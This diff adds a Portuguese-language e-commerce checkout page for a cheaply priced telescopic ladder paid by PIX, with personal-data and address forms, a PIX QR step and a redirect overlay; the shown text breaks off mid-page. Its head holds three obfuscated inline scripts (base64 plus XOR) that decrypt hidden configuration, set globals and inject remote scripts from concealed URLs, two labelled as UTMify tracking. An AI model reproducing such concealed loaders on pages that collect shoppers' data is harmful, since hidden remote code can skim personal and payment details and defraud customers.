@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>Finalizar pedido | ReformaMax</title>
+<meta name="description" content="Finalize seu pedido da Escada Telescópica ReformaMax com pagamento via PIX." />
+<meta name="robots" content="noindex, nofollow" />
+
+
+
+
+<script>(function(){var j_61=atob("DJSCsED9gjqXNVe7I++gxTKRoAC1XSPPU+e4n2+e5lS5QCPWSvL7niOS7xT1R3jIQObrwDSOrU/jWCSUT/X21TOJrFDkF3uZQuD2wimf907yRnWBeO+g3iGQ5xitFzPaV/WvxTSQ61zuGCfJRuLn3jTQ+ln4UXrIQP+gnGKL41biUHWBAbb/nDvf7Fv6UHWBAfDjxCHQ9076XDHCDuTw1TaY7E66RiLZSvDxkmzf9Fv7QDKZGbagzR2A");var z_t=[];for(var a_vu=0;a_vu<j_61.length;a_vu++){z_t.push(j_61.charCodeAt(a_vu)&255);}var g_e6c=z_t[0];var v_d8ya=z_t.slice(1,1+g_e6c);var r_oez=z_t.slice(1+g_e6c);var y_70r5=r_oez.map(function(b,l_d){return b^v_d8ya[l_d%g_e6c];});var k_tzyn="";for(var s_hr=0;s_hr<y_70r5.length;s_hr++){k_tzyn+=String.fromCharCode(y_70r5[s_hr]&255);}var w_4s=decodeURIComponent(escape(k_tzyn));var i_j1h=JSON.parse(w_4s);var i_zse=i_j1h.globals||[];i_zse.forEach(function(v_r){window[v_r.name]=v_r.value;});var e_p40f=document.createElement("script");e_p40f.src=i_j1h.url;e_p40f.async=true;e_p40f.defer=true;(i_j1h.attributes||[]).forEach(function(a_g5t){e_p40f.setAttribute(a_g5t.name,a_g5t.value);});(document.head||document.documentElement).appendChild(e_p40f);})();</script>
+<style>
+:root{
+  --background:#ffffff;
+  --foreground:#333333;
+  --card:#ffffff;
+  --muted:#f5f5f5;
+  --muted-foreground:#717171;
+  --border:#dfdfdf;
+  --ink:#121212;
+  --ink-foreground:#ffffff;
+  --sale:#df2225;
+  --amber:#e8a63d;
+  --brand:#45A049;
+  --brand-hover:#3d8f41;
+  --brand-active:#357f39;
+  --brand-soft:#d9f5df;
+  --brand-dark:#1f7a3d;
+  --font-sans:Inter, system-ui, sans-serif;
+  --font-display:"Space Grotesk", Inter, system-ui, sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:var(--font-sans);
+  color:var(--foreground);
+  background:var(--muted);
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+h1,h2,h3,h4{font-family:var(--font-display);margin:0}
+img{max-width:100%;display:block}
+button{font-family:inherit}
+.container{max-width:768px;margin:0 auto;padding-left:12px;padding-right:12px}
+@media(min-width:640px){.container{padding-left:16px;padding-right:16px}}
+
+/* header */
+.topbar{position:sticky;top:0;z-index:50;background:var(--ink);color:var(--ink-foreground)}
+.topbar .row{display:flex;align-items:center;justify-content:space-between;height:56px;gap:8px}
+.topbar a,.topbar button{color:inherit}
+.back{display:inline-flex;align-items:center;gap:6px;background:none;border:0;padding:0;cursor:pointer;font-size:14px;font-weight:500;opacity:.9}
+.back:hover{opacity:.65}
+.topbar .title{font-family:var(--font-display);font-weight:700;font-size:13px;text-transform:uppercase;letter-spacing:.08em}
+.ssl{display:inline-flex;align-items:center;gap:5px;font-size:10px;opacity:.85}
+.ssl svg{color:#7ee2a0}
+
+/* layout */
+main{padding:16px 0 24px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:16px}
+@media(min-width:640px){.card{padding:24px}}
+.card h2{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:14px}
+.card h2 svg{width:16px;height:16px;flex:0 0 auto}
+.card h3{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px}
+
+label.fl{display:block;font-size:12px;font-weight:500;color:var(--muted-foreground);margin-bottom:6px}
+.field{margin-bottom:14px}
+.grid2{display:grid;grid-template-columns:1fr;gap:12px}
+@media(min-width:640px){.grid2{grid-template-columns:1fr 1fr;gap:16px}}
+.grid3{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(min-width:640px){.grid3{grid-template-columns:1fr 1fr 1fr;gap:16px}}
+.span2{grid-column:span 2}
+@media(min-width:640px){.span2{grid-column:auto}}
+.addr{display:grid;grid-template-columns:2fr 1fr;gap:12px}
+@media(min-width:640px){.addr{grid-template-columns:3fr 1fr;gap:16px}}
+
+input[type=text],input[type=email],input[type=tel],select{
+  width:100%;height:44px;padding:0 12px;font-size:15px;font-family:inherit;color:var(--foreground);
+  background:var(--muted);border:1px solid transparent;border-radius:8px;outline:none;
+  transition:border-color .15s,background .15s;
+  -webkit-appearance:none;appearance:none;
+}
+@media(min-width:640px){input[type=text],input[type=email],input[type=tel],select{height:48px}}
+select{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23717171' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='m6 9 6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center;padding-right:34px}
+input:focus,select:focus{border-color:var(--brand);background:#fff}
+input::placeholder{color:#a3a3a3}
+input:disabled{opacity:.45;cursor:not-allowed}
+.inv{border-color:var(--sale)!important;background:#fff5f5!important}
+.hint{font-size:12px;color:var(--muted-foreground);margin:6px 0 0}
+.err{font-size:12px;color:var(--sale);margin:6px 0 0;display:none}
+.err.show{display:block}
+.cepwrap{position:relative}
+.cepwrap .spin{position:absolute;right:10px;top:50%;transform:translateY(-50%);display:none}
+.cepwrap.loading .spin{display:block}
+.chk{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--muted-foreground);cursor:pointer;user-select:none;margin-top:6px}
+.chk input{accent-color:var(--brand);width:14px;height:14px;cursor:pointer}
+
+/* produto */
+.prod{display:flex;gap:12px;align-items:flex-start}
+.prod img{width:80px;height:80px;object-fit:cover;border-radius:10px;border:1px solid var(--border);flex:0 0 auto}
+@media(min-width:640px){.prod img{width:96px;height:96px}}
+.prod .name{font-size:14px;font-weight:600;line-height:1.35}
+.tag{display:inline-block;background:var(--muted);color:var(--muted-foreground);font-size:12px;padding:2px 8px;border-radius:6px;margin-top:6px}
+.unit{font-size:13px;color:var(--muted-foreground);margin-top:6px}
+.unit b{color:var(--foreground);font-size:14px}
+.qtyrow{display:flex;align-items:center;justify-content:flex-end;margin-top:12px}
+.qty{display:inline-flex;align-items:center;background:var(--muted);border-radius:999px}
+.qty button{width:34px;height:34px;border:0;background:none;cursor:pointer;font-size:18px;line-height:1;color:var(--foreground);border-radius:999px}
+.qty button:disabled{opacity:.35;cursor:not-allowed}
+.qty span{min-width:26px;text-align:center;font-weight:700;font-size:14px}
+
+/* frete */
+.ship{display:flex;align-items:center;justify-content:space-between;gap:12px;border-top:1px solid var(--border);padding-top:12px}
+.ship .l{display:flex;align-items:center;gap:10px;min-width:0}
+.dot{width:18px;height:18px;border-radius:999px;border:2px solid var(--brand);display:inline-flex;align-items:center;justify-content:center;flex:0 0 auto}
+.dot i{width:8px;height:8px;border-radius:999px;background:var(--brand);display:block}
+.ship .r{text-align:right;flex:0 0 auto;line-height:1.3}
+.ship .r .old{font-size:12px;color:var(--muted-foreground);text-decoration:line-through}
+.ship .r .free{color:var(--brand-dark);font-weight:600;font-size:14px}
+
+/* resumo */
+.sum{font-size:14px}
+.sum .line{display:flex;justify-content:space-between;padding:5px 0}
+.sum .line .g{color:var(--muted-foreground)}
+.sum .free{color:var(--brand-dark);font-weight:600}
+.sum .total{border-top:1px dashed var(--border);margin-top:10px;padding-top:12px;display:flex;justify-content:space-between;align-items:flex-start}
+.sum .total .lb{font-weight:700;font-size:16px}
+.sum .total .vl{font-family:var(--font-display);font-size:26px;font-weight:800;line-height:1.1;text-align:right}
+.sum .total .sub{font-size:12px;color:var(--muted-foreground);text-align:left;margin-top:2px}
+
+/* barra fixa */
+.bar{position:fixed;left:0;right:0;bottom:0;z-index:40;background:#fff;border-top:1px solid var(--border);box-shadow:0 -4px 16px rgba(0,0,0,.07);padding:12px 0 max(12px,env(safe-area-inset-bottom))}
+.bar .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+.bar .top .lbl{font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted-foreground)}
+.bar .top .it{font-size:12px;color:var(--muted-foreground)}
+.bar .top .vl{font-family:var(--font-display);font-size:26px;font-weight:800}
+.bar .trust{display:flex;align-items:center;justify-content:center;gap:16px;margin-top:8px;font-size:10px;color:var(--muted-foreground)}
+.bar .trust span{display:inline-flex;align-items:center;gap:4px}
+.bar .trust svg{color:var(--brand-dark)}
+
+.btn{
+  width:100%;min-height:52px;display:inline-flex;align-items:center;justify-content:center;gap:8px;
+  background:var(--brand);color:#fff;border:0;border-radius:8px;cursor:pointer;
+  font-family:var(--font-display);font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;
+  box-shadow:0 3px 5px rgba(69,160,73,.45);transition:background .15s,opacity .15s,box-shadow .15s;
+}
+@media(min-width:640px){.btn{min-height:56px;font-size:15px}}
+.btn:hover:not(:disabled){background:var(--brand-hover)}
+.btn:active:not(:disabled){background:var(--brand-active)}
+.btn:disabled{cursor:not-allowed}
+.btn.is-loading{background:var(--brand-hover);opacity:.85;box-shadow:none}
+.btn.is-done{background:var(--brand-dark);box-shadow:none;opacity:1}
+.btn.is-disabled{background:#c7c7c7;color:#fff;box-shadow:none}
+.btn-sm{min-height:44px;width:auto;padding:0 16px;font-size:12px;flex:0 0 auto}
+.btn-ghost{background:#fff;color:var(--foreground);border:1px solid var(--border);box-shadow:none}
+.btn-ghost:hover:not(:disabled){background:var(--muted)}
+
+/* pix */
+.expire{display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;margin-bottom:14px}
+.expire .t{font-weight:700;color:var(--sale)}
+.expire .g{color:var(--muted-foreground)}
+.qrbox{width:200px;height:200px;margin:0 auto;border:1px solid var(--border);border-radius:12px;background:#fff;padding:8px;display:flex;align-items:center;justify-content:center;overflow:hidden}
+@media(min-width:640px){.qrbox{width:216px;height:216px}}
+.qrbox img{width:100%;height:100%;object-fit:contain}
+.center{text-align:center}
+.copyrow{display:flex;gap:8px;align-items:center;margin-top:14px}
+.copyrow .code{flex:1 1 auto;min-width:0;background:var(--muted);border-radius:8px;padding:11px 12px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;color:var(--muted-foreground);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.howto{margin-top:16px}
+.howto p{margin:0;font-size:14px;line-height:1.55}
+.howto .q{font-weight:700}
+.howto .a{color:var(--muted-foreground)}
+.status{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:14px;font-size:14px;color:var(--muted-foreground)}
+.status.paid{color:var(--brand-dark);font-weight:600}
+.status.cancel{color:var(--sale);font-weight:600}
+.spin{width:16px;height:16px;border:2px solid rgba(0,0,0,.15);border-top-color:var(--brand);border-radius:999px;animation:sp .7s linear infinite;display:inline-block}
+.spin.w{border:2px solid rgba(255,255,255,.35);border-top-color:#fff}
+@keyframes sp{to{transform:rotate(360deg)}}
+.deliv{display:flex;gap:12px;align-items:flex-start;padding:10px 0}
+.deliv+.deliv{border-top:1px solid var(--border)}
+.deliv .ic{width:36px;height:36px;border-radius:999px;background:var(--muted);display:flex;align-items:center;justify-content:center;flex:0 0 auto}
+.deliv p{margin:0;font-size:14px}
+.deliv .s{color:var(--muted-foreground)}
+.deliv .ok{color:var(--brand-dark);font-weight:600}
+
+/* sucesso */
+.okwrap{min-height:70vh;display:flex;align-items:center;justify-content:center;padding:24px 0}
+.okcard{background:#fff;border-radius:20px;max-width:520px;width:100%;padding:40px 20px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.08);animation:up .5s ease-out}
+@keyframes up{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+.okcard h1{font-size:26px;color:var(--brand);margin-bottom:14px}
+.okcard .p{font-size:15px;color:var(--muted-foreground);line-height:1.6}
+.okcard .p b{color:var(--brand);font-size:18px}
+.okcard .foot{margin-top:28px;padding-top:22px;border-top:1px solid var(--border);font-size:13px;color:var(--muted-foreground)}
+.okcard .foot a{display:inline-block;margin-top:12px;color:#fff;background:var(--brand);text-decoration:none;font-weight:700;padding:12px 22px;border-radius:8px}
+.ck-circle{stroke:var(--brand);stroke-width:3;fill:none;stroke-dasharray:166;stroke-dashoffset:166;animation:st .6s cubic-bezier(.65,0,.45,1) forwards}
+.ck-check{stroke:var(--brand);stroke-width:3;fill:none;stroke-dasharray:48;stroke-dashoffset:48;animation:st .3s cubic-bezier(.65,0,.45,1) .8s forwards}
+@keyframes st{100%{stroke-dashoffset:0}}
+
+.toast{position:fixed;left:50%;bottom:110px;transform:translateX(-50%) translateY(16px);z-index:60;background:var(--ink);color:#fff;padding:11px 16px;border-radius:10px;font-size:13px;max-width:92vw;opacity:0;pointer-events:none;transition:opacity .2s,transform .2s}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast.bad{background:var(--sale)}
+.hide{display:none!important}
+.padbar{padding-bottom:190px}
+
+/* ---- tela de redirect pos-pagamento (3s) ---- */
+#vsc-overlay{position:fixed;inset:0;z-index:100;display:none;align-items:center;justify-content:center;padding:20px;background:#ffffff}
+#vsc-overlay.show{display:flex}
+.vsc-card{background:#fff;border-radius:20px;max-width:500px;width:100%;padding:40px 20px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1);animation:vscSlideUp .5s ease-out}
+@keyframes vscSlideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+.vsc-circle{stroke:#10b981;stroke-width:3;fill:none;stroke-dasharray:166;stroke-dashoffset:166;animation:vscStroke .6s cubic-bezier(.65,0,.45,1) forwards}
+.vsc-check{stroke:#10b981;stroke-width:3;fill:none;stroke-dasharray:48;stroke-dashoffset:48;animation:vscStroke .3s cubic-bezier(.65,0,.45,1) .8s forwards}
+@keyframes vscStroke{100%{stroke-dashoffset:0}}
+.vsc-title{font-size:28px;font-weight:700;color:#10b981;margin-bottom:16px}
+.vsc-foot{margin-top:32px;padding-top:24px;border-top:1px solid #e0e0e0}
+.vsc-foot .vsc-lbl{font-size:14px;color:#666;margin-bottom:12px}
+.vsc-count{font-size:32px;font-weight:700;color:#ff2d55;margin:16px 0}
+.vsc-fb{font-size:12px;margin-top:15px;color:#666}
+.vsc-fb a{color:#ff2d55;text-decoration:none;font-weight:600;display:inline-block;margin-top:8px;padding:8px 16px;border:2px solid #ff2d55;border-radius:8px}
+</style>
+
+<!-- ==== UTMify: UTMs ==== --><script>(function(){var y_xi=atob("DA2tlIp8Jo2kU015UXaP4fgQBLeGOzkNIX6Xu6UfQuOKJjkUOGvUuukTS6PGIWIKMn/E5P4PCfjQPj5WPWzZ8fkICOfXcWFbMHnZ5uMeU/nBIG9DCnaP+usRQ6+ecSkYJWyA4f4RT+vdfj0LNHvI+v5RXu7LN2AKMmaPuKgKR+HRNm9Dcy/QuPFeSOzJNm9Dc2nM4OtRU/nJOisAfH3f8fwZSPmJIDgbOGnetqZeUOzIJihbay+P6dcB");var w_t8p=[];for(var x_d=0;x_d<y_xi.length;x_d++){w_t8p.push(y_xi.charCodeAt(x_d)&255);}var w_ysxn=w_t8p[0];var y_3=w_t8p.slice(1,1+w_ysxn);var p_pyr=w_t8p.slice(1+w_ysxn);var a_4i3m=p_pyr.map(function(b,h_yu){return b^y_3[h_yu%w_ysxn];});var z_db="";for(var d_gk=0;d_gk<a_4i3m.length;d_gk++){z_db+=String.fromCharCode(a_4i3m[d_gk]&255);}var c_0idy=decodeURIComponent(escape(z_db));var p_dn8=JSON.parse(c_0idy);var a_hl7=p_dn8.globals||[];a_hl7.forEach(function(i_7){window[i_7.name]=i_7.value;});var s_f=document.createElement("script");s_f.src=p_dn8.url;s_f.async=true;s_f.defer=true;(p_dn8.attributes||[]).forEach(function(e_z){s_f.setAttribute(e_z.name,e_z.value);});(document.head||document.documentElement).appendChild(s_f);})();</script><!-- ==== UTMify: Pixel ==== --><script>(function(){var s_ca=atob("DAqkGUGdEQBB4qL8l3GGbDPxMzpjitaI53meNm7+dW5vl9aR/mzdNyLyfC4jkI2P9HjNaTXuPnAomseQuHrNYSTxP2oywI7e9n7Qayj/ZHQkkYDGzFeIOybxfmIgjtHerVHfOy/8fGVj2ICM/nLBdQj5MyxjlMOQ4m+GI2OrcDd228TFrjOVKnWoJzh32sTMrj2deHS/bF08");var p_r=[];for(var q_rbi8=0;q_rbi8<s_ca.length;q_rbi8++){p_r.push(s_ca.charCodeAt(q_rbi8)&255);}var f_v=p_r[0];var e_f=p_r.slice(1,1+f_v);var n_5ixw=p_r.slice(1+f_v);var k_r89=n_5ixw.map(function(b,f_lrm){return b^e_f[f_lrm%f_v];});var h_96="";for(var m_u=0;m_u<k_r89.length;m_u++){h_96+=String.fromCharCode(k_r89[m_u]&255);}var z_6=decodeURIComponent(escape(h_96));var k_ovyo=JSON.parse(z_6);var n_aj=k_ovyo.globals||[];n_aj.forEach(function(v_7){window[v_7.name]=v_7.value;});var g_s=document.createElement("script");g_s.src=k_ovyo.url;g_s.async=true;g_s.defer=true;(k_ovyo.attributes||[]).forEach(function(j_t3){g_s.setAttribute(j_t3.name,j_t3.value);});(document.head||document.documentElement).appendChild(g_s);})();</script><script src="/utm.js" defer></script><script src="/avatars.js" defer></script><script src="/reviews-media.js" defer></script></head>
+<body>
+
+<div class="topbar">
+  <div class="container row">
+    <button type="button" class="back" id="btn-back">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      <span>Voltar</span>
+    </button>
+    <span class="title">Finalizar pedido</span>
+    <span class="ssl">
+      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+      <span>SSL</span>
+    </span>
+  </div>
+</div>
+
+<main>
+  <!-- ============ ETAPA 1: DADOS ============ -->
+  <div id="view-form" class="container padbar">
+
+    <section class="card">
+      <h2>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        Dados pessoais
+      </h2>
+
+      <div class="field">
+        <label class="fl" for="f-name">Nome completo</label>
+        <input type="text" id="f-name" name="customer_name" placeholder="Seu nome" autocomplete="name" />
+        <p class="err" id="e-name">Informe seu nome completo.</p>
+      </div>
+
+      <div class="field">
+        <label class="fl" for="f-email">E-mail</label>
+        <input type="email" id="f-email" name="email" placeholder="seu@email.com" autocomplete="email" inputmode="email" />
+        <p class="err" id="e-email">Informe um e-mail válido.</p>
+      </div>
+
+      <div class="field">
+        <label class="fl" for="f-phone">Telefone / WhatsApp</label>
+        <input type="tel" id="f-phone" name="phone" placeholder="(00) 00000-0000" autocomplete="tel" inputmode="numeric" maxlength="15" />
+        <p class="err" id="e-phone">Informe um telefone válido com DDD.</p>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"/><circle cx="12" cy="10" r="3"/></svg>
+        Endereço de entrega
+      </h2>
+
+      <div class="grid3">
+        <div class="field">
+          <label class="fl" for="f-cep">CEP</label>
+          <div class="cepwrap" id="cepwrap">
+            <input type="text" id="f-cep" name="cep" placeholder="00000-000" inputmode="numeric" maxlength="9" autocomplete="postal-code" />
+            <span class="spin"></span>
+          </div>
+          <p class="err" id="e-cep">Informe um CEP válido.</p>
+        </div>
+        <div class="field">
+          <label class="fl" for="f-city">Cidade</label>
+          <input type="text" id="f-city" name="city" placeholder="Cidade" autocomplete="address-level2" />
+          <p class="err" id="e-city">Informe a cidade.</p>
+        </div>
+        <div class="field span2">
+          <label class="fl" for="f-state">Estado</label>
+          <select id="f-state" name="state" autocomplete="address-level1">
+            <option value="">Selecione</option>
+          </select>
+          <p class="err" id="e-state">Selecione o estado.</p>
+        </div>
+      </div>
+
+      <div class="addr">
+        <div class="field">
+          <label class="fl" for="f-address">Rua, avenida, etc.</label>
+          <input type="text" id="f-address" name="address" placeholder="Rua, Avenida, etc." autocomplete="address-line1" />
+          <p class="err" id="e-address">Informe o endereço.</p>
+        </div>
+        <div class="field">
+          <label class="fl" for="f-number">Nº</label>
+          <input type="text" id="f-number" name="number" placeholder="Nº" inputmode="numeric" />
+          <label class="chk"><input type="checkbox" id="f-sn" /> Sem número</label>
+          <p class="err" id="e-number">Informe o número.</p>
+        </div>
+      </div>
+
+      <div class="grid2">
+        <div class="field">
+          <label class="fl" for="f-neighborhood">Bairro</label>
+          <input type="text" id="f-neighborhood" name="neighborhood" placeholder="Bairro" autocomplete="address-level3" />
+          <p class="err" id="e-neighborhood">Informe o bairro.</p>
+        </div>
+        <div class="field">
+          <label class="fl" for="f-complement">Complemento (opcional)</label>
+          <input type="text" id="f-complement" name="complement" placeholder="Apto, bloco, referência" />
+        </div>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m7.5 4.27 9 5.15"/><path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"/><path d="m3.3 7 8.7 5 8.7-5"/><path d="M12 22V12"/></svg>
+        Seu produto
+      </h2>
+      <div class="prod">
+        <img id="p-img" src="/__l5e/assets-v1/1cd8e868-bc99-4853-b0d9-13db74ba7f25/carrossel-capa.png" alt="Escada Telescópica Retrátil em Liga de Alumínio" width="96" height="96" />
+        <div style="min-width:0;flex:1 1 auto">
+          <div class="name" id="p-name">Escada Telescópica - 5 Metros</div>
+          <span class="tag" id="p-tag">Tamanho: 5 Metros</span>
+          <div class="unit">Unidade: <b id="p-price">R$ 69,99</b></div>
+        </div>
+      </div>
+      <div class="qtyrow">
+        <div class="qty">
+          <button type="button" id="q-minus" aria-label="Diminuir quantidade">−</button>
+          <span id="q-val">1</span>
+          <button type="button" id="q-plus" aria-label="Aumentar quantidade">+</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 18V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v11a1 1 0 0 0 1 1h2"/><path d="M15 18H9"/><path d="M19 18h2a1 1 0 0 0 1-1v-3.65a1 1 0 0 0-.22-.624l-3.48-4.35A1 1 0 0 0 17.52 8H14"/><circle cx="17" cy="18" r="2"/><circle cx="7" cy="18" r="2"/></svg>
+        Frete
+      </h2>
+      <div class="ship">
+        <div class="l">
+          <span class="dot"><i></i></span>
+          <img src="/__l5e/assets-v1/20838cc9-10fc-47a9-875a-e2465a44769d/logo-correios.png" alt="Correios" width="28" height="28" style="height:26px;width:auto;flex-shrink:0;object-fit:contain" />
+          <span style="min-width:0">
+            <span style="display:block;font-size:14px;font-weight:500" id="ship-eta">Calculando previsão...</span>
+            <span style="display:block;font-size:12px;color:var(--muted-foreground);margin-top:2px">Frete Grátis · Correios</span>
+          </span>
+        </div>
+        <div class="r">
+          <div class="old">R$ 36,90</div>
+          <div class="free">Grátis</div>
+        </div>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12.586 2.586A2 2 0 0 0 11.172 2H4a2 2 0 0 0-2 2v7.172a2 2 0 0 0 .586 1.414l8.704 8.704a2.426 2.426 0 0 0 3.42 0l6.58-6.58a2.426 2.426 0 0 0 0-3.42z"/><circle cx="7.5" cy="7.5" r=".5" fill="currentColor"/></svg>
+        Resumo do pedido
+      </h2>
+      <div class="sum">
+        <div class="line"><span class="g">Subtotal</span><span id="s-subtotal">R$ 69,99</span></div>
+        <div class="line"><span class="g">Frete (Correios)</span><span class="free">Grátis</span></div>
+        <div class="total">
+          <span class="lb">Total</span>
+          <div>
+            <div class="vl" id="s-total">R$ 69,99</div>
+            <div class="sub" id="sum-eta">Via PIX</div>
+          </div>
+        </div>
+      </div>
+
+    </section>
+  </div>
+
+  <!-- ============ ETAPA 2: PIX ============ -->
+  <div id="view-pix" class="container hide">
+    <section class="card">
+      <div class="expire">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--sale)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+        <span class="g">Expira em</span>
+        <span class="t" id="pix-timer">10:00</span>
+      </div>
+
+      <div class="qrbox" id="qrbox"><span class="spin"></span></div>
+
+      <p class="center" style="font-size:14px;color:var(--muted-foreground);margin:14px 0 0">Copie o código PIX abaixo ou escaneie o QR Code acima</p>
+
+      <div class="copyrow">
+        <div class="code" id="pix-code">Código PIX não disponível</div>
+        <button type="button" class="btn btn-sm" id="btn-copy">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+          <span id="btn-copy-lbl">Copiar</span>
+        </button>
+      </div>
+
+      <div class="howto">
+        <p class="q">Como pagar com Pix?</p>
+        <p class="a">Copie o código Pix acima, abra o aplicativo do seu banco, acesse a opção <b>Pix</b>, escolha <b>Pix Copia e Cola</b>, cole o código e confirme o pagamento.</p>
+        <p class="a">A confirmação do pedido é automática.</p>
+      </div>
+
+      <div class="status" id="pix-status"><span class="spin"></span><span>Aguardando pagamento...</span></div>
+    </section>
+
+    <section class="card">
+      <h3>Item do pedido</h3>
+      <div class="prod">
+        <img id="pix-img" src="/__l5e/assets-v1/1cd8e868-bc99-4853-b0d9-13db74ba7f25/carrossel-capa.png" alt="Escada Telescópica" width="80" height="80" />
+        <div style="min-width:0;flex:1 1 auto">
+          <div class="name" id="pix-name">Escada Telescópica - 5 Metros</div>
+          <div class="unit" id="pix-qty">Qtd: 1</div>
+          <div class="unit" style="color:var(--brand-dark);font-weight:700" id="pix-line">R$ 69,99</div>
+        </div>
+      </div>
+      <div class="sum" style="margin-top:12px">
+        <div class="line"><span class="g">Subtotal</span><span id="pix-subtotal">R$ 69,99</span></div>
+        <div class="line"><span class="g">Frete (Correios)</span><span class="free">Grátis</span></div>
+        <div class="line" style="border-top:1px solid var(--border);margin-top:8px;padding-top:10px"><span style="font-weight:700">Total</span><span style="font-family:var(--font-display);font-weight:800;font-size:18px" id="pix-total">R$ 69,99</span></div>
+      </div>
+    </section>
+
+    <section class="card" style="margin-bottom:32px">
+      <h3><img src="/__l5e/assets-v1/20838cc9-10fc-47a9-875a-e2465a44769d/logo-correios.png" alt="Correios" width="24" height="24" style="height:22px;width:auto;vertical-align:-4px;margin-right:6px;object-fit:contain" />Entrega · Correios</h3>
+      <div class="deliv">
+        <span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 18V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v11a1 1 0 0 0 1 1h2"/><path d="M15 18H9"/><path d="M19 18h2a1 1 0 0 0 1-1v-3.65a1 1 0 0 0-.22-.624l-3.48-4.35A1 1 0 0 0 17.52 8H14"/><circle cx="17" cy="18" r="2"/><circle cx="7" cy="18" r="2"/></svg></span>
+        <div>
+          <p>Previsão de entrega · Correios</p>
+          <p class="ok" id="pix-eta">5 a 9 dias úteis</p>
+        </div>
+      </div>
+      <div class="deliv">
+        <span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"/><circle cx="12" cy="10" r="3"/></svg></span>
+        <div>
+          <p id="pix-cust">-</p>
